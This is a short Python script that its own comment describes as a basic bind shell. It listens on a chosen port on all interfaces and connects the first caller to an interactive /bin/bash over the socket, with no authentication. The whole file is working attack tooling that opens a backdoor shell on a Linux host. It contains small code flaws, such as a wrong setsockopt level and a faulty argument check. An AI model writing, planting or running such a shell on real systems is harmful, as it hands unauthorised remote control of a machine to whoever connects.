#!/usr/bin/env python

# This script will create a basic bind shell listening on a Linux port

import socket
import subprocess
import sys

def main(port):
    try:
        port = int(port)

    except ValueError:
        print ("This does not seem to be a valid number.")
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)
    s.bind(("", port))
    s.listen(1)
    (conn, address) = s.accept()
    p = subprocess.Popen(["/bin/bash","-i"], stdin=conn, stdout=conn, stderr=conn)

if __name__ == "__main__":
    if not sys.argv[1]:
        rport = raw_input("What is the port number to listen on? ")
    else:
        rport = sys.argv[1]
    main(rport)
